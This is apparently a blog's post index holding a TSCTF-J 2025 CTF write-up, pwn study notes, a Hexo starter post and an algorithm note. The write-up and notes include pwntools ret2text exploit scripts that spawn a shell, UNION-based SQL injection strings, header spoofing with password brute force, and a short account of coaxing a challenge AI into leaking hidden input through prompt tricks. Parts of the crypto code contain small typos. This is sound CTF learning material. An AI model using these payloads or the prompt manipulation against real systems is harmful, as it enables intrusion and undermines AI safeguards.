[{"title":"2025 TSCTF-J WP","url":"/posts/4c9af485/","content":"AI:Coup给出前中后期策略，然后开roll策略：前期苟，中期挑软柿子打，后期有把握就开原文：Early on, prioritize safe income generation or using the Duke’s Tax for economy, while avoiding unnecessary bluffs. As funds reach 7-9, leverage Coups or Assassinations to target the weakest opponent , accelerating the game to a one-on-one scenario. Maintain resource control to avoid forced Coups at 10, and use challenges sparingly based on opponent patterns—challenge only when bluff probability is high. In late game, concentrate attacks on the remaining player, balancing aggression with survival; for instance, bluff cautiously in head-to-head situations due to higher challenge risks.\nThreeFairy Tales误打误撞，反提示操作，将执剑人temperature拉到70，将情报变成每个字藏在每句话第二个字的一段话，结果ai把输入的话又输出了，通过\n\nCrypto：Cantor’s_gift康托展开数，逐除（n-1-i）！得到打乱序列，还原字符串数字符串长度得到n&#x3D;37初始化\nfactorials=[1]*n\n    if n&gt;1:\n        temp_fact=1\n        for i in range(1,n):\n            temp_fact*=i\n            factorials[i]=temp_fact\n    avail=list(range(1,n+1))\nperm=[]\nX=cantor_num\n\n还原康托展开，还原随机排序    for i in range(n):        fact_val&#x3D;factorials[n-1-i]        index&#x3D;X&#x2F;&#x2F;fact_val        X&#x3D;X%fact_val        element&#x3D;avail.pop(index)        perm.append(element)\n排序反向，还原字符串\ninverse_perm=[0]*len(perm)\nfor pos,val in enumerate(perm):inverse_perm[val-1]=pos+1//反向\nFlag=bytearray(len(hint2))\n    for i in range(len(hint2)):\n        Flag[i]=hint2[inverse_perm[i]-1]\n\nsign_in异或回去，恢复flag base64解码将字符串转成整型\nkey1=int(KEY1,16)\nkey2_xor_key1=int(KEY2_XOR_KEY1,16)\nkey2_xor_key3=int(KEY2_XOR_KEY3,16)\nflag_xor_all=int(FLAG_XOR_ALL,16)\n\n异或回去\nKey2=key2_xor_key1^key1\nkey3=key2^key2_xor_key3\nm=flag_xor_all^key1^key2^key3\n\n转回字符串\nhex_str=hex(m)[2:]\nflag_byte=bytes.fromhex(hex_str)\nflag=base64.b64decode(flag_bytes).decode(&#39;utf-8&#39;)\n\np&#x3D;~qp，q类似取反，q+p=3*2**1023\n设：p=2^(1023)+a*2+1\nq=2^(1023)+ b*2 1   \nb=(2^1022-1)-a\n\n带入n解方程得到p，q\ns=3*(1&lt;&lt;1023)\nD=s*s-4*n\nsqrt_D=math.isqrt(D)\np=(s+sqrt_D)//2\nq=(S-sqrt_D)//2\n计算私钥，d=pow(e,-1,(p-1)(q-1))\nphi=(p-1)*(q-1)\nd=pow(e,-1,phi)\n解密m=pow(c,d,n)\nm=pow(c,d,n)\nflag=long_to_bytes(m)\n\n野狐禅Paillier加密还原计算得到y\ny_vals=[]\nfor i in range(150):\n    c_i=ciphertexts[i]\nraw_i=lcg_raws[i]\nr_i=raw_i%n\n    t_i=pow(r_i,n,n2)\n    inv_t_i=pow(t_i,-1,n2)\n    z_i=(c_i*inv_t_i)%n2\n    m_val_i=(z_i-1)//n\n    y_vals.append(m_val_i)\n\n构建线性关系求解\nb=y_vals[k:2*k]\nA =[]\n    for i in range(k):\nrow=[]\n        for j in range(k):\nindex=k+i-1-j\n        row.append(y_vals[index])\n    A.append(row)\nA_matrix=Matrix(A)\nb_vector=Matrix(b）\nc_vector=A_matrix.solve(b_vector)\ncoeffs=[int(c)for c in c_vector]\n\n还原flag\nn_flag=sum(coeffs[j]*(3**j)for j in range(k))\nflag_bytes = long_to_bytes(n_flag)\n\n\nmiscBadFile打开txt和wav分析需要找出的文件需要找出个人信息，pdf则在010中分析，发现加入了类似网站源码的编码，Txt和wav硬翻，pdf取了内存最大的五个\nMeow根据010打开得到的提示调整解码方式，a-zA-Z0-+&#x2F;&#x3D;，根据绿色深浅调整字符串排序在Cyberchef中解码得到\n卢森堡的秘密卢森堡的首字母就是lsb，简单Lsb隐写\n\nPwnRet打开ida找到&#x2F;bin&#x2F;sh地址0x400794backdoor函数地址：0x400676找到vul函数，得到需要填充缓冲区16+rbp 8字节根据提示找到ret地址0x4006b6，栈对齐提交payload2 &#x3D;b’A’*offset+p64(ret)+p64(backdoor)填充缓冲区+栈平衡+backdoor地址\n\nWebDruid根据提示&#x2F;Druid随便试账号和密码，admin admin过了\nEZ_login根据提示加X-Forward伪造本地管理员然后burpsuit爆破得到密码simple\nEZ_SQL查询返回几列数据 1’ ORDER BY 3 – 成功 4 失败联合查询1’ UNION SELECT 1,2,3 –CONVERT把第一个flag变成 flag USING utf81’ UNION SELECT 1,CONVERT(flag USING utf8), 3 FROM flag – \n","categories":["wp"],"tags":["CTF","wp"]},{"title":"Hello World","url":"/posts/4a17b156/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"title":"pwn学习记录（其一）","url":"/posts/e04c41db/","content":"函数调用过程\ncall func&#x3D;push eip,jmp\npush ebp\nmov ebp,esp\nsub esp,0x20…\nleave &#x3D; mov esp,ebp;pop ebp\nret &#x3D; pop eip\n\npush,pop指令小结push执行push ax指令时，相当于将指针减小，再将ax中的内容放入指针所指的内存单元处，指针指向新栈顶\npop执行pop ax指令时，相当于将指针所指的内容放入ax处，再将指针增大，指针指向新栈顶\n\nret2text基础其一(以TSCTF-J ret题为例)原理由于程序使用了gets，strcpy等易溢出函数，导致读取的数据溢出，覆盖栈上的返回地址和控制参数，使指针跳转到想要的func地址位置。\n常见溢出函数gets；scanf；strcpy；sprintf：memcpy；strcat……\nchecksecchecksec函数可以用来查看程序开了什么保护措施No canary found即意味可以利用栈溢出来获得shell\ncyclic通过cyclic生成指定长度的字符串，注入字符串，可以知道栈的大小如图，在注入16个字符时程序并没有报错，而注入24个字符时程序报错，说明想要使栈溢出，至少要注入24个字符或是构建脚本\nfrom pwn import *\ncontext.log_level = &#39;debug&#39;\n# 生成测试pattern\nio = process(&#39;./pwn&#39;)\npattern = cyclic(100)\nio.sendlineafter(b&#39;Just a simple sign-in!&#39;, pattern)\nio.wait()\n# 分析崩溃地址\ncore = io.corefile\nrip = core.rip\nprint(f&quot;崩溃地址: &#123;hex(rip)&#125;&quot;)\n# 计算偏移量\noffset = cyclic_find(rip &amp; 0xffffffffffff)\nprint(f&quot;精确偏移量: &#123;offset&#125;&quot;)\n\nret在ida中打开程序，注意到main函数，vuln函数，和backdoor函数，一个是主函数，另一个是可以利用的漏洞，而最后一个和打通这个程序息息相关\n不仅可以通过cyclic查看溢出需要的字节数，也可以通过ida查看计算如图vuln占据了8+10&#x3D;18个字节，而rbp本身还占8个字节，因此需要24个字节，计算结果与cyclic结果相同\n接下来找到backdoor地址来跳转（0x400676）接下来构建payload&#x3D;b’a’*24+p64(0X4006760)\nio=process(&#39;./pwn&#39;)\nio.recvuntil(&#39;Welcome to TSCTF-J2025!\\nJust a simple sign-in!\\n&#39;)\npayload=b&#39;a&#39;*24+p64(0x400676)\nio.send(payload)\nio.interactive()\n\n提交后发现无法成功这是因为还需要栈对齐（这与本地的操作系统有一定关系）详细可查看栈对齐\n在payload中加上p64(ret)输入命令ls后列出目录，说明已经获得权限\n官方wp以上是做题时的想法，接下来展示官方给出的做法\nio=process(&#39;./pwn&#39;)\nio.recvuntil(&#39;Welcome to TSCTF-J2025!\\nJust a simple sign-in!\\n&#39;)\npayload=b&#39;a&#39;*24+p64(0x40067a)\nio.send(payload)\nio.interactive()    \n\n0x40067a 所对应的汇编代码为mov edi, offset command ; &quot;/bin/sh&quot;类似于直接执行system，跳过了前面的push rbp，也就不用栈对齐,更加简洁，也可能更加不稳定(?)，但值得借鉴\n","categories":["CTF"],"tags":["CTF","pwn"]},{"title":"二分图匹配","url":"/posts/34711169/","content":"\n计导课上无聊，看了二分匹配相关的内容，遂记录\n\n二分图如果一个图的顶点可以分为两个集合，图的所有边的两个顶点分属两个集合，则该图为“二分图” (Bipartite Graph)\n二分图的最大匹配匹配：在图论中，一个“匹配”（matching）是一个边的集合，其中任意两条边都没有公共顶点一个图所有匹配中，所含匹配边数最多的匹配，称为这个图的最大匹配。二分图的应用中，求最大匹配数是最常见的，其他的很多问题都可以转化为求最大匹配数（如最小覆盖数）\nDFS实现匈牙利算法伪代码从一侧点出发，通过相连的线段到达未与其他点匹配的另一侧点，最大匹配数即为符合上述要求的点的个数通过dfs算法实现，从左侧点出发，尝试连接右侧点\nint hungary()&#123;\n    int res=0;//res初始化，用来记录匹配最大匹配数\n    memset(linker,-1,sizeof(linker));//linker[]用来记录目前右边点的连接情况\n    for(int l=0;l &lt; lN;l++)\n    &#123;\n        memset(used,0,sizeof(used));//对于该点，初始时未开始与左侧各点连接\n        if(dfs(u))res++;//通过dfs判定上述要求能否成功\n    &#125;//lN为左侧点的个数，l为正在尝试连接的点的序号\n    return res;//返回最大匹配数\n&#125;\nbool dfs(int l)&#123;\n    for(int r=0;r &lt; rN;r++)&#123;\n        if(g[l][r] &amp;&amp; !used[r])&#123;\n            used[r]=1;\n            if(linker[r]==-1 || dfs(linker[r]))&#123;\n                linker[r]=u;\n                return 1;\n            &#125;\n        &#125;\n    &#125;\n    return 0;\n    /*r为右边点序号，rN为右边点个数，g[][]记录左右两侧点的连接情况\n    对于未被尝试连接过的点，如果该点未与其他点连接则直接相连(linker[r]==-1)，将右侧点的连接对象标记为该点\n    若已有左侧点p与其相连，先将该右侧点标记为不可再连，再去考虑点p能否与其他点相连(dfs(linker[r]))\n    以此类推，最后找到一个左侧点与右侧未与其他相连的点连接，则返回真，匹配数加一，否则匹配数不变*/\n&#125;\n\n二分图匹配匈牙利算法dfs实现的优劣优点：\n\n算法的邻接矩阵适用于稠密矩阵\n算法实现简洁，易于理解学习\n\n缺点：\n\n时间复杂度O(VE)，V为顶点数，E为边数，对于二分图匹配，理论上存在更快的算法——Hopcrott-Karp算法，该算法利用BFS同时寻找多条互补相交的最短增广路，并在一次迭代中全部用于增广。时间复杂度达到O(sqrt(V)*E),但在规模不大的稀疏图中，由于常数因子较小且易于实现，仍然常用\n\n匈牙利算法的应用示例（最大匹配数及其变式）求最大匹配数广泛应用于任务分配、网络流优化、稳定婚姻问题等领域\n最小顶点覆盖求取最少的顶点，使每条线至少和其中一个顶点关联二分图最小顶点覆盖&#x3D;二分图最大匹配数(koning 定理)\n最大独立数选取最多的点，使任意所选两点均不相连最大独立数&#x3D;最大匹配数\nDAG图的最小路径覆盖对于一个 DAG（有向无环图），选取最少条路径，使得每个顶点属于且仅属于一条路径。路径长可以为 0（即单个点）最小路径覆盖数 &#x3D; 顶点数 - 最大匹配数\n总结基于DFS算法实现匈牙利算法，本质上还是穷举所有可能，如果DFS学习到位还是非常好理解的\n","categories":["算法"],"tags":["算法"]}]